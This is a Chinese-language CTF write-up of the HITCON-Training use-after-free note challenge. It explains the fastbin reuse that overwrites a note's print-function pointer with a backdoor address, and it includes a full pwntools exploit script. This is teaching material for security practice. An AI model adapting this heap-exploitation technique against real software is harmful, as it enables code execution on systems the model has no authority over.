---
title: "hitcontraininguaf"
date: 2026-11-13 19:08:04
categories:
  - "题目复现"
  - "HITCON"
tags: []
---

<!-- 本文件由 tools/sync_notes.py 生成，请勿手动编辑；改 notes/ 里的源笔记后重新同步 -->
<!-- sync-source: notes/external/typora-pwn/pwn题目.md#5 -->
![image-20261014190626316](/pwn-notes/images/notes/image-20261014190626316.png)

32位程序

![image-20261014190721531](/pwn-notes/images/notes/image-20261014190721531.png)

依旧菜单题

虽然add函数看不懂，但是可以看到delete函数有uaf漏洞，但这是两个指针吗，反正free两次，但是都没有清零。

![image-20261014192344598](/pwn-notes/images/notes/image-20261014192344598.png)

创建一个新的笔记的时候都是会创建一个结构体即是8字节的，里面存的是printf_note的地址和内容地址，之后紧跟着的才是想要存入的内容，

所以现在就是想将printf_note的内容改成后门函数地址。

在fastbin中，释放掉的堆块是按照相对应的大小进行排列的，因为两个结构体的大小都是8字节，所以只需要申请两个大于8字节size大小的堆块，之后再次申请一个大小为8字节size的堆块

这一步就相当于直接就把一开始申请的两个结构体申请出来，这样就可以修改第二个结构体头部的prinf_not函数地址的内容，于是修改为我们后门函数地址。

![image-20261014201624641](/pwn-notes/images/notes/image-20261014201624641.png)



```python
from pwn import *

context(arch="i386",os="linux",log_level="debug")

p = process("./pwn")
elf = ELF("./pwn")
# p = remote("node5.buuoj.cn",27273)

def addnote(size = b'32',content = b'A'*32):
	p.sendlineafter(b'Your choice :',b'1')
	p.sendafter(b'Note size :',size)
	p.sendafter(b'Content :',content)

def delnote(index):
	p.sendlineafter(b'Your choice :',b'2')
	p.sendafter(b'Index :',index)

def printnote(index):
	p.sendlineafter(b'Your choice :',b'3')
	p.sendafter(b'Index :',index)

def m_exit():
	p.sendlineafter(b'Your choice :',b'4')
addnote()
addnote()

delnote(b'0')
delnote(b'1')

magic=0x8048945

p.sendlineafter(b'Your choice :',b'1')
p.sendafter(b'Note size :',b'8')
p.sendafter(b'Content :',p64(magic))

printnote(b'0')

p.interactive()

```

<!-- sync-hash: f1f616cc34715a4a03bee648321ac0c21abcbdc57103e80ecfaf410079126641 -->
